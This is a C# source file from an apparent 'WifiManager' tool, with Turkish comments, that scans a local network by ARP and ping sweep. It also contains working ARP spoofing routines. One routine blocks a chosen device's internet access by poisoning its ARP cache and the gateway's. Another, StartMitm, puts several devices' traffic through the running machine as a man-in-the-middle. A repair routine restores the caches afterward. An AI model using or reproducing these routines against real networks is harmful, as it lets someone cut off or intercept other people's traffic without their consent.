using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using WifiManager.Models;

namespace WifiManager.Core
{
    /// <summary>
    /// Python ARPTool sınıfının C# karşılığı.
    /// ARP tarama, engelleme ve ARP onarma işlemlerini yürütür.
    /// </summary>
    public class ArpTool
    {
        // ----------------------------------------------------------------
        // Alanlar
        // ----------------------------------------------------------------
        public string LocalIP   { get; private set; }
        public string LocalMAC  { get; private set; }
        public string GatewayIP { get; private set; }
        public string NetMask   { get; private set; }

        private readonly LibPcapLiveDevice? _device;
        private readonly DeviceStore _store;
        private readonly List<string>    _subnetHosts;
        private readonly HashSet<string> _subnetSet;

        public List<DeviceInfo> Devices { get; } = new();

        // ----------------------------------------------------------------
        // Ctor
        // ----------------------------------------------------------------
        public ArpTool(DeviceStore store)
        {
            _store    = store;
            LocalIP   = NetworkHelper.GetLocalIP();
            var parts = LocalIP.Split('.');
            NetMask   = string.Join(".", parts[..3]);
            var detectedGW = NetworkHelper.GetDefaultGateway(LocalIP);
            GatewayIP = !string.IsNullOrEmpty(detectedGW) ? detectedGW : NetMask + ".1";
            LocalMAC  = NetworkHelper.GetLocalMAC(LocalIP);
            _device   = NetworkHelper.FindBestDevice(LocalIP);
            _subnetHosts = NetworkHelper.GetSubnetHosts(LocalIP);
            _subnetSet   = new HashSet<string>(_subnetHosts);
        }

        public LibPcapLiveDevice? Device => _device;

        // ----------------------------------------------------------------
        // ARP Tarama — event handler düzgün yönetilir
        // ----------------------------------------------------------------
        public async Task ScanAsync(Action<DeviceInfo> onDevice, CancellationToken ct)
        {
            if (_device == null) return;

            await Task.Run(async () =>
            {
                lock (Devices) { Devices.Clear(); }
                var seenIPs  = new HashSet<string>();
                var seenMACs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                // ── ARP cache temizle ──────────────────────────────────────────
                // Windows, ARP cache'de kayıt varken tekrar ARP SORMAZ.
                // Telefon uyurken cache doluysa asla yakalanamaz.
                // Temizleyince ping sweep sırasında her cihaz için taze ARP gönderilir.
                // Not: Task.Run içinde yapıyoruz ki UI'ı (Yanıt Vermiyor) kitlemesin
                FlushArpCache();

            // Named delegate — unsubscribe için zorunlu
            PacketArrivalEventHandler? scanHandler = null;
            scanHandler = (_, e) =>
            {
                try
                {
                    var raw = Packet.ParsePacket(e.GetPacket().LinkLayerType, e.GetPacket().Data);
                    if (raw?.PayloadPacket is ArpPacket arp && arp.Operation == ArpOperation.Response)
                    {
                        var ip  = arp.SenderProtocolAddress.ToString();
                        var mac = string.Join(":", arp.SenderHardwareAddress.GetAddressBytes()
                                                   .Select(b => b.ToString("x2")));
                        ProcessArpReply(ip, mac, seenIPs, seenMACs, onDevice);
                    }
                }
                catch { }
            };

            try
            {
                // Önceki oturumdan açık kalmışsa temizle
                if (_device.Opened)
                {
                    try { _device.StopCapture(); } catch { }
                    try { _device.Close();       } catch { }
                }
                _device.Open(DeviceModes.Promiscuous, 100);
                _device.Filter = "arp";
                _device.OnPacketArrival += scanHandler;
                _device.StartCapture();

                // 1) Ping sweep paralel — Windows ARP cache'ini doldurur
                //    Telefon/tablet gibi cihazlar ping'e hemen yanıt verir
                var pingTask = Task.Run(() => PingSweep(ct), ct);

                // 2) ARP broadcast — 12 tur, 800ms aralık = ~10 saniye
                for (int r = 0; r < 12 && !ct.IsCancellationRequested; r++)
                {
                    SendArpBroadcast();
                    await Task.Delay(800, ct); // ContinueWith yok — iptal anında exception fırlatır
                }

                // Ping sweep bitmesini bekle
                try { await pingTask; } catch { }
            }
            finally
            {
                _device.OnPacketArrival -= scanHandler;
                try { _device.StopCapture(); } catch { }
                try { _device.Close();       } catch { }
            }

                // ARP cache'den eksikleri tamamla (ping doldurunca buraya düşer)
                ReadArpCache(seenIPs, seenMACs, onDevice);

                // IP sırasına göre sırala
                lock (Devices)
                {
                    Devices.Sort((a, b) =>
                    {
                        var aa = a.IP.Split('.').Select(int.Parse).ToArray();
                        var bb = b.IP.Split('.').Select(int.Parse).ToArray();
                        for (int i = 0; i < 4; i++)
                        {
                            int cmp = aa[i].CompareTo(bb[i]);
                            if (cmp != 0) return cmp;
                        }
                        return 0;
                    });
                }
            }); // Task.Run sonu
        }

        // ----------------------------------------------------------------
        // ARP Cache Temizle — subnet'teki tüm eski girdileri sil
        // ----------------------------------------------------------------
        private void FlushArpCache()
        {
            try
            {
                // 'arp -d *' tüm dynamic girdileri temizler
                var psi = new System.Diagnostics.ProcessStartInfo("arp", "-d *")
                {
                    CreateNoWindow         = true,
                    UseShellExecute        = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true
                };
                using var proc = System.Diagnostics.Process.Start(psi);
                proc?.WaitForExit(2000);
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // Ping Sweep — /24 subnet, 16'lık batch'lerle (router rate limit koruması)
        // ----------------------------------------------------------------
        private void PingSweep(CancellationToken ct)
        {
            const int batchSize = 16;
            var allIPs = _subnetHosts;

            for (int b = 0; b < allIPs.Count && !ct.IsCancellationRequested; b += batchSize)
            {
                var batch = allIPs.Skip(b).Take(batchSize);
                var tasks = batch.Select(target => Task.Run(() =>
                {
                    try
                    {
                        using var ping = new System.Net.NetworkInformation.Ping();
                        ping.Send(target, 800);
                    }
                    catch { }
                }, ct)).ToList();

                try
                { 
                    Task.WhenAll(tasks).Wait(ct); 
                } 
                catch 
                { 
                    // Hata olsa bile döngüyü KIRMA (break yapma). 
                    // Bir ping exception fırlatsa bile diğer IP'lere devam et.
                }

                // Batch'ler arası kısa bekleme — router'ı rahatlatır
                Thread.Sleep(50);
            }
        }

        // ----------------------------------------------------------------
        // ARP broadcast gönder (/24 subnet)
        // ----------------------------------------------------------------
        private void SendArpBroadcast()
        {
            if (_device == null || string.IsNullOrEmpty(LocalMAC)) return;
            try
            {
                var localMac  = ParseMAC(LocalMAC);
                var bcast     = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
                var localIP   = IPAddress.Parse(LocalIP).GetAddressBytes();

                int idx = 0;
                foreach (var host in _subnetHosts)
                {
                    var destIP = IPAddress.Parse(host).GetAddressBytes();

                    var arpPkt = new ArpPacket(
                        ArpOperation.Request,
                        new PhysicalAddress(new byte[6]),
                        new IPAddress(destIP),
                        new PhysicalAddress(localMac),
                        new IPAddress(localIP));

                    var eth = new EthernetPacket(
                        new PhysicalAddress(localMac),
                        new PhysicalAddress(bcast),
                        EthernetType.Arp)
                    { PayloadPacket = arpPkt };

                    _device!.SendPacket(eth);

                    // Her 16 pakette 10ms bekle — modem broadcast storm korumasını tetiklemesin
                    idx++;
                    if (idx % 16 == 0) Thread.Sleep(10);
                }
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // Tek ARP cevabını işle
        // ----------------------------------------------------------------
        private void ProcessArpReply(string ip, string mac,
            HashSet<string> seenIPs, HashSet<string> seenMACs,
            Action<DeviceInfo> onDevice)
        {
            if (string.IsNullOrEmpty(ip) || string.IsNullOrEmpty(mac)) return;
            lock (seenIPs)
            {
                if (seenIPs.Contains(ip) || seenMACs.Contains(mac)) return;
                seenIPs.Add(ip);
                seenMACs.Add(mac);
            }

            var dev = new DeviceInfo
            {
                IP       = ip,
                MAC      = mac.ToLower(),
                Hostname = NetworkHelper.ResolveHostname(ip),
                Label    = _store.ResolveName(mac)
            };
            lock (Devices) { Devices.Add(dev); }
            onDevice(dev);
        }

        // ----------------------------------------------------------------
        // Windows ARP cache
        // ----------------------------------------------------------------
        private void ReadArpCache(HashSet<string> seenIPs, HashSet<string> seenMACs,
                                  Action<DeviceInfo>? onDevice)
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName               = "arp",
                    Arguments              = "-a",
                    RedirectStandardOutput = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };
                using var proc = System.Diagnostics.Process.Start(psi)!;
                var output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();

                foreach (var line in output.Split('\n'))
                {
                    var t = line.Trim();
                    var firstToken = t.Split(new char[] { ' ', '\t' }, 2, StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "";
                    if (!_subnetSet.Contains(firstToken)) continue;
                    var p = t.Split(new char[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries);
                    if (p.Length < 2) continue;
                    var ip  = p[0].Trim();
                    var mac = p[1].Trim().Replace("-", ":").ToLower();
                    // _subnetSet network/broadcast adresleri zaten içermiyor;
                    // .255 / .0 kontrolü /23+ ağlarda geçerli host'ları yanlış eleyebilir
                    if (mac == "ff:ff:ff:ff:ff:ff" || mac == "00:00:00:00:00:00") continue;
                    if (mac.Contains("?") || mac.Length < 11) continue; // eksik/geçersiz MAC
                    lock (seenIPs)
                    {
                        if (seenIPs.Contains(ip) || seenMACs.Contains(mac)) continue;
                        seenIPs.Add(ip);
                        seenMACs.Add(mac);
                    }
                    var dev = new DeviceInfo
                    {
                        IP       = ip,
                        MAC      = mac,
                        Hostname = NetworkHelper.ResolveHostname(ip),
                        Label    = _store.ResolveName(mac)
                    };
                    lock (Devices) { Devices.Add(dev); }
                    onDevice?.Invoke(dev);
                }
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // Gateway MAC
        // ----------------------------------------------------------------
        public string? GetGatewayMAC()
        {
            lock (Devices)
            {
                var cached = Devices.FirstOrDefault(d => d.IP == GatewayIP);
                if (cached != null) return cached.MAC;
            }
            return ProbeMAC(GatewayIP);
        }

        private string? ProbeMAC(string ip)
        {
            if (_device == null) return null;
            string? found = null;

            PacketArrivalEventHandler? handler = null;
            handler = (_, e) =>
            {
                try
                {
                    var raw = Packet.ParsePacket(e.GetPacket().LinkLayerType, e.GetPacket().Data);
                    if (raw?.PayloadPacket is ArpPacket arp &&
                        arp.Operation == ArpOperation.Response &&
                        arp.SenderProtocolAddress.ToString() == ip)
                    {
                        found = string.Join(":", arp.SenderHardwareAddress.GetAddressBytes()
                                               .Select(b => b.ToString("x2")));
                    }
                }
                catch { }
            };

            try
            {
                _device.Open(DeviceModes.Promiscuous, 100);
                _device.Filter = $"arp host {ip}";
                _device.OnPacketArrival += handler;
                _device.StartCapture();
                SendSingleArpProbe(ip);
                Thread.Sleep(1500);
            }
            finally
            {
                _device.OnPacketArrival -= handler;
                try { _device.StopCapture(); } catch { }
                try { _device.Close();       } catch { }
            }
            return found;
        }

        private void SendSingleArpProbe(string targetIP)
        {
            if (_device == null || string.IsNullOrEmpty(LocalMAC)) return;
            try
            {
                var localMac = ParseMAC(LocalMAC);
                var bcast    = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
                var localIP  = IPAddress.Parse(LocalIP).GetAddressBytes();
                var destIP   = IPAddress.Parse(targetIP).GetAddressBytes();

                var arpPkt = new ArpPacket(ArpOperation.Request,
                    new PhysicalAddress(new byte[6]),
                    new IPAddress(destIP),
                    new PhysicalAddress(localMac),
                    new IPAddress(localIP));

                var eth = new EthernetPacket(
                    new PhysicalAddress(localMac),
                    new PhysicalAddress(bcast),
                    EthernetType.Arp)
                { PayloadPacket = arpPkt };

                _device.SendPacket(eth);
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // ARP Spoof paketi
        // ----------------------------------------------------------------
        private void SendSpoofPacket(string victimIP, string victimMAC,
                                     string srcIP, string srcMAC)
        {
            if (_device == null) return;
            try
            {
                var srcMac = ParseMAC(srcMAC);
                var dstMac = ParseMAC(victimMAC);

                var arp = new ArpPacket(ArpOperation.Response,
                    new PhysicalAddress(dstMac),
                    new IPAddress(IPAddress.Parse(victimIP).GetAddressBytes()),
                    new PhysicalAddress(srcMac),
                    new IPAddress(IPAddress.Parse(srcIP).GetAddressBytes()));

                var eth = new EthernetPacket(
                    new PhysicalAddress(srcMac),
                    new PhysicalAddress(dstMac),
                    EthernetType.Arp)
                { PayloadPacket = arp };

                _device.SendPacket(eth);
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // Cihaz Engelle
        // ----------------------------------------------------------------
        public Task StartBlocking(string targetIP, string targetMAC,
                                  string gatewayMAC, CancellationToken ct,
                                  Action<int>? onPacket = null)
        {
            if (_device == null) return Task.CompletedTask;

            return Task.Run(() =>
            {
                bool wasOpen = _device.Opened;
                if (!wasOpen)
                {
                    try { _device.Open(DeviceModes.Promiscuous, 100); }
                    catch { return; }
                }

                int count = 0;
                try
                {
                    while (!ct.IsCancellationRequested)
                    {
                        SendSpoofPacket(targetIP, targetMAC, GatewayIP, LocalMAC);
                        SendSpoofPacket(GatewayIP, gatewayMAC, targetIP, LocalMAC);
                        count++;
                        try { onPacket?.Invoke(count); } catch { }
                        Thread.Sleep(1500);
                    }
                }
                finally
                {
                    RestoreARP(targetIP, targetMAC, gatewayMAC);
                    if (!wasOpen) try { _device.Close(); } catch { }
                }
            }, CancellationToken.None);
        }

        // ----------------------------------------------------------------
        // ARP Onar
        // ----------------------------------------------------------------
        public void RestoreARP(string targetIP, string targetMAC, string gatewayMAC)
        {
            if (_device == null) return;
            bool wasOpen = _device.Opened;
            if (!wasOpen)
            {
                try { _device.Open(DeviceModes.Promiscuous, 100); }
                catch { return; }
            }
            try
            {
                for (int i = 0; i < 5; i++)
                {
                    SendSpoofPacket(targetIP, targetMAC, GatewayIP, gatewayMAC);
                    SendSpoofPacket(GatewayIP, gatewayMAC, targetIP, targetMAC);
                    Thread.Sleep(200);
                }
            }
            finally
            {
                if (!wasOpen) try { _device.Close(); } catch { }
            }
        }

        // ----------------------------------------------------------------
        // MITM — birden fazla hedef için tek döngü (internet kesmeden)
        // ----------------------------------------------------------------
        public Task StartMitm(List<DeviceInfo> targets, string gatewayMAC,
                              CancellationToken ct)
        {
            if (_device == null || targets.Count == 0) return Task.CompletedTask;

            return Task.Run(() =>
            {
                bool wasOpen = _device.Opened;
                if (!wasOpen)
                {
                    try { _device.Open(DeviceModes.Promiscuous, 100); }
                    catch { return; }
                }

                try
                {
                    while (!ct.IsCancellationRequested)
                    {
                        foreach (var t in targets)
                        {
                            SendSpoofPacket(t.IP, t.MAC, GatewayIP, LocalMAC);
                            SendSpoofPacket(GatewayIP, gatewayMAC, t.IP, LocalMAC);
                        }
                        Thread.Sleep(1500);
                    }
                }
                finally
                {
                    foreach (var t in targets)
                        RestoreARP(t.IP, t.MAC, gatewayMAC);
                    if (!wasOpen) try { _device.Close(); } catch { }
                }
            }, CancellationToken.None);
        }

        // ----------------------------------------------------------------
        // Geç gelen cihazlar için ek ARP cache taraması
        // ----------------------------------------------------------------
        public void SupplementScan(Action<DeviceInfo> onDevice)
        {
            var seenIPs  = new HashSet<string>(Devices.Select(d => d.IP));
            var seenMACs = new HashSet<string>(Devices.Select(d => d.MAC),
                               StringComparer.OrdinalIgnoreCase);
            ReadArpCache(seenIPs, seenMACs, onDevice);
        }

        // ----------------------------------------------------------------
        // Cihaz ismi güncelle
        // ----------------------------------------------------------------
        public void RenameDevice(DeviceInfo dev, string newName)
        {
            _store.SetName(dev.MAC, newName);
            dev.Label = newName;
        }

        // ----------------------------------------------------------------
        // Yardımcı
        // ----------------------------------------------------------------
        public static byte[] ParseMAC(string mac) =>
            mac.Split(':', '-').Select(h => Convert.ToByte(h, 16)).ToArray();
    }
}
